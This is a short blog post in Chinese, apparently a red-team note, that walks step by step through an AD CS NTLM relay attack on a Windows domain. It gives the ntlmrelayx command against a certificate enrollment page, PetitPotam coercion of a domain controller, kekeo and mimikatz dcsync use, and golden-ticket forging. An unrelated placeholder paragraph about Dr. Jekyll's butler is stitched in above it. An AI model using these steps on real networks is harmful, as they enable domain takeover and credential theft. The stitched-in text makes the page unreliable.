---
layout: post
title: AD CS relay Attack
---

*The Strange Case of Dr. Jekyll and Mr. Hyde* tells the story of a lawyer investigating the connection of two persons, Dr. Henry Jekyll and Mr. Edward Hyde. Chief among the novel's supporting cast is a man by the name of Mr. Poole, Dr. Jekyll's loyal butler.

-----

## **ADCS 核心原理**

证书服务发布的部分证书可用于kerberos认证，并且在返回的PAC里面能拿到NTLM hash。

AD CS（Active Directory 证书服务）特别有趣，因为它提供默认接受基于 NTLM 的身份验证的角色服务。这些服务具体包括**证书颁发机构 Web 注册**和**证书注册 Web 服务**。

**注:要完成本次攻击域必须安装ADCS服务，且证书注册的web页面不能开启https。**

攻击机器上

```python
python3 ntlmrelayx.py -debug -smb2support --target http://172.23.119.119/certsrv/certfnsh.asp --adcs --template KerberosAuthentication
```

![image-20210813111552386](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210813111552386.png)

内网一台已经有的据点或者攻击机也可以PetitPotam.exe 10.0.0.5 dc01，120连接的是辅域，打回辅域DC02的net-ntlm

![image-20210813111357522](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210813111357522.png)

![image-20210813111704436](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210813111704436.png)

keko利用

![image-20210813115049121](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210813115049121.png)

![image-20210813115314598](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210813115314598.png)

然后mimikatz dcsync即可

![image-20210813115227928](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210813115227928.png)

拥有 NTLM 哈希允许我们创建`krbtgt`[Kerberos Golden Tickets]()。



